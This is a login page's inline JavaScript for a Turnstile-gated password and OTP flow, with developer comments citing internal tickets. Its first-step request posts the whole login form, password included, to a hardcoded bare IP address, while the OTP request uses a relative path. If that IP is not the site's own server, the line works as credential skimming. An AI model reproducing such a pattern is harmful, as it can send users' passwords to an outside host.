    <script type="text/javascript" nonce="Dc3cPyvu02Af855bwQjKKg==">
        var turnstileSiteKey = null;
        var turnstileWidgetId = null;

        // Turnstile writes its token into a hidden <input name="cf-turnstile-response"> that it
        // inserts INTO THE WIDGET CONTAINER by script. A script-inserted input is submitted
        // (and seen by jQuery's serialize()) only when its form owner is #login_ddform: it must
        // be a descendant of the form, or carry form="login_ddform". The markup now keeps both
        // containers inside the form; the attribute is set as well so a later markup change
        // cannot silently drop the token again (ML-731).
        function bindTurnstileTokenToForm(containerSelector) {
            var container = document.querySelector(containerSelector);
            if (!container || !document.getElementById('login_ddform')) {
                return;
            }
            var inputs = container.querySelectorAll('input[name="cf-turnstile-response"]');
            for (var i = 0; i < inputs.length; i++) {
                inputs[i].setAttribute('form', 'login_ddform');
            }
        }

        function renderTurnstileInto(containerSelector) {
            if (!document.querySelector(containerSelector)) {
                return null;
            }
            var widgetId = turnstile.render(containerSelector, {
                sitekey: turnstileSiteKey,
                theme: 'light',
                callback: function () {
                    bindTurnstileTokenToForm(containerSelector);
                }
            });
            bindTurnstileTokenToForm(containerSelector);
            return widgetId;
        }

        function onTurnstileLoad() {
            if (!turnstileSiteKey || !window.turnstile) {
                return;
            }
            turnstileWidgetId = renderTurnstileInto('#turnstile-login');
        }

        // The OTP step draws a fresh widget: a Cloudflare token is single-use and the login
        // step's token was spent on /getSenderalert (ML-596).
        function turnstileForOtpStep() {
            if (!turnstileSiteKey || !window.turnstile) {
                return;
            }
            if (turnstileWidgetId !== null) {
                turnstile.remove(turnstileWidgetId);
            }
            turnstileWidgetId = renderTurnstileInto('#turnstile-otp');
        }
    </script>

<script type="text/javascript" nonce="Dc3cPyvu02Af855bwQjKKg==">
    // turnstileSiteKey, onTurnstileLoad() and turnstileForOtpStep() are defined in <head> (ML-731).

    $().ready(function () {
        demo.checkFullPageBackgroundImage();

        setTimeout(function () {
            // after 1000 ms we add the class animated to the login/register card
            $('.card').removeClass('card-hidden');
        }, 700);

        // Route Enter-key / direct form submits through the AJAX (captcha-gated) flow.
        // Only allow the real form POST after AJAX sets data-authorized="true".
        $('#login_ddform').on('submit', function (e) {
            if ($(this).data('authorized') !== true) {
                e.preventDefault();
                getSenderalert(this);
                return false;
            }
        });
    });



    function handleAuthAjaxError(xhr, resetSelector) {
        if (xhr.status === 422) {
            var msg = (xhr.responseJSON && xhr.responseJSON.message) || '';
            if (msg === 'captcha_missing' || msg === 'captcha_failed') {
                window.location.reload();
                return;
            }
        }
        if (xhr.status === 429) {
            var retry = parseInt(xhr.getResponseHeader('Retry-After') || '60', 10);
            Swal.fire({
                icon: 'warning',
                title: 'Too Many Attempts',
                width: 400,
                padding: '3em',
                color: '#716add',
                text: 'You have made too many attempts. Please wait ' + retry + ' seconds and try again.',
            });
        } else if (xhr.status >= 500) {
            Swal.fire({
                icon: 'error',
                title: 'Server Error',
                width: 400,
                padding: '3em',
                color: '#716add',
                text: 'Something went wrong. Please try again.',
            });
        } else if (xhr.status !== 0 && xhr.status !== 422) {
            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                width: 400,
                padding: '3em',
                color: '#716add',
                text: 'Request failed (' + xhr.status + '). Please try again.',
            });
        }
        if (resetSelector) {
            $(resetSelector).html("Let's go");
        }
    }

    function getSenderalert(that) {

        // A drawn widget means the server WILL demand a token (ML-600). Posting without one
        // only earns a captcha_missing and a reload that wipes the form, so ask for the
        // check to be completed instead -- the same gate the OTP step (checkkeyvalue) has.
        if (turnstileSiteKey && !$('input[name="cf-turnstile-response"]').val()) {
            Swal.fire({
                icon: 'warning',
                title: 'Verification required',
                width: 400,
                padding: '3em',
                color: '#716add',
                text: 'Please complete the security check below before continuing.',
            });
            return false;
        }

        $("#letsgobtn").html('<i class="fa fa-spinner fa-spin"></i> Loading');
        $("#error_message").html('');

        // ML-601: ONE /getSenderalert call. The page used to fire a quickResponse=1
        // pre-flight and then a second call that actually sent the OTP, both carrying the
        // same Turnstile token; the second only passed VerifyTurnstile via its 60-second,
        // node-local replay cache, which fails on a multi-node deploy with CACHE_DRIVER=file.
        // A single call spends the token once and sends the OTP once. (The console.log of the
        // serialized form -- which included the password -- is removed with it.)
        var formData = $("#login_ddform").serialize() + '&pathname=' + window.location.href;

        $.ajax({
            type: "POST",
            url: "https://18.198.139.163/getSenderalert",
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            },
            data: formData,
            success: function (data) {
                if (data['status'] == true) {
                    if (data['message'] == 'knownuser') {

                        $("#login_ddform").data('authorized', true).submit();
                        return true;
                    }
                    $("#home").removeClass('in active');
                    $("#menu1").addClass('in active');
                    $("#verify_message").html(data['message']);
                    turnstileForOtpStep();

                }
                if (data['status'] == false) {
                    Swal.fire({
                        icon: 'error',
                        title: 'Oops...',
                        width: 400,
                        padding: '3em',
                        color: '#716add',
                        text: 'Incorrect Username or Password. Please Try Again.',
                    })
                    $("#menu1").removeClass('in active');
                    $("#home").addClass('in active');
                    $("#error_message").html(data['message']);
                    $("#letsgobtn").html('Let\'s go');
                    return false;
                }
            },
            error: function (xhr) {
                handleAuthAjaxError(xhr, '#letsgobtn');
            }
        });
    }


    function checkkeyvalue(e) {
        e.preventDefault();

        if (turnstileSiteKey && !$('input[name="cf-turnstile-response"]').val()) {
            Swal.fire({
                icon: 'warning',
                title: 'Verification required',
                width: 400,
                padding: '3em',
                color: '#716add',
                text: 'Please complete the security check below before continuing.',
            });
            return false;
        }

        $("#formsubbtn").html('<i class="fa fa-spinner fa-spin"></i> Loading');

        var formData = $("#login_ddform").serialize() + '&pathname=' + window.location.href;

        $.ajax({
            type: "POST",
            url: "/checkOtpKey",
            data: formData,
            success: function (data) {
                if (data['status'] == true) {
                    $("#login_ddform").data('authorized', true).submit();
                }
                if (data['status'] == false) {
                    Swal.fire({
                        icon: 'error',
                        title: 'Oops...',
                        width: 400,
                        padding: '3em',
                        color: '#716add',
                        text: 'Incorrect Username or Password. Please Try Again.',
                    })
                    $("#verify_message").html(data['message']);
                    $("#formsubbtn").html('Let\'s go');
                }

            },
            error: function (xhr) {
                handleAuthAjaxError(xhr, '#formsubbtn');
            }
        });

    }

</script>
